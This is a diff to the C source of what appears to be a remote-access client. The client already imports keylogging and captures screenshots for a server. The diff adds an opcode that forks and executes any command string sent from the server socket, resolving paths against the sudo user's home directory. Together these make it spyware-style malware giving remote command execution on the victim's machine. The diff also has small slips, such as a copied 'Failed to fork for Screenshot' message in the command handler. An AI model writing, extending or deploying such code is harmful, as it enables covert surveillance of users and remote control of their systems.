@@ -8,6 +8,7 @@
 #include <string.h>
 #include <sys/wait.h>
 #include <unistd.h>
+#include <pwd.h>
 #include <fcntl.h>
 #include "clientManager.h"
 #include "keylog.h"
@@ -145,6 +146,68 @@ void handleScreenshotOpcode()
     remove(filename);
 }
 
+void expandTilde(char ** args)
+{
+    for(int i = 0; args[i] != NULL; i++)
+    {
+        if(args[i][0] == '~')
+        {
+            const char* user = getenv("SUDO_USER");
+            struct passwd *pw = getpwnam(user);
+            const char* home = pw->pw_dir;
+            
+            char* expanded = malloc(strlen(home) + strlen(args[i]));
+            sprintf(expanded, "%s%s", home, args[i] + 1);
+            args[i] = expanded;
+        }
+    }
+}
+
+void handleCommandOpcode(message_t msg)
+{
+    pid_t pid = fork();
+
+    if (pid == 0)
+    {
+        int argCount = 0;
+        char*temp = strdup(msg.buffer);
+        char*p = strtok(temp, " ");
+        while(p)
+        {
+            argCount++;
+            p = strtok(NULL, " ");
+        }
+        free(temp);
+        char**args = (char**)malloc((argCount + 1) * sizeof(char*));
+        int i = 0;
+        p = strtok(msg.buffer, " ");
+        while(p)
+        {
+            args[i++] = p;
+            p = strtok(NULL, " ");
+        }
+        args[i] = NULL;
+        expandTilde(args);
+        printf("%s %s", args[0], args[1]);
+        fflush(0);
+        execvp(args[0], args);
+        perror("Command");
+        exit(EXIT_FAILURE);
+    }
+    else if (pid > 0)
+    {
+        wait(NULL);
+    }
+    else
+    {
+        msg.opCode = 'E';
+        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
+        msg.size = strlen(msg.buffer);
+        sendMessage(clientData.serverSocket, &msg);
+    }
+}
+
+
 void handleOpcode(message_t msg)
 {
     switch (msg.opCode)
@@ -154,6 +217,9 @@ void handleOpcode(message_t msg)
         break;
     case 'S':
         handleScreenshotOpcode();
+        break;
+    case 'C':                           ///////De adaugat si in Obsidian
+        handleCommandOpcode(msg);
         break;
     }
 }
